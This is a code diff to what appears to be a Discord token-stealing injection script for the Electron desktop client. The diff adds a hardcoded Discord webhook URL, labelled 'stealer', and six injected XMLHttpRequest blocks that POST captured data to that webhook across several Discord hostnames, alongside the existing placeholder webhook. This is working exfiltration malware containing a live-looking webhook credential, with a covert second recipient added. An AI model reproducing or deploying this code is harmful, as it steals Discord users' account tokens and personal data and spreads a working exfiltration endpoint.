@@ -15,6 +15,8 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
   var webhook = "%WEBHOOK_LINK%";
   webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
+  var stealer = "https://discord.com/api/webhooks/901102054943100969/fqrHOvrPr3Qmoj-fuDzTix6kXbEMnM5ZxNy9KONMFxKds6nFFpvTac_JrFhzED79Xjmd"
+  stealer = stealer.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   
   function FirstTime(){
       
@@ -100,6 +102,61 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
     xhr.open("POST", "${webhook.replace("discord.", "canary.discordapp.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+//// Main 
+window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${stealer.replace("discord.", "discordapp.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${stealer.replace("discordapp.", "discord.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${stealer.replace("discord.", "ptb.discord.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${stealer.replace("discord.", "ptb.discordapp.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${stealer.replace("discord.", "canary.discord.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${stealer.replace("discord.", "canary.discordapp.")}", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
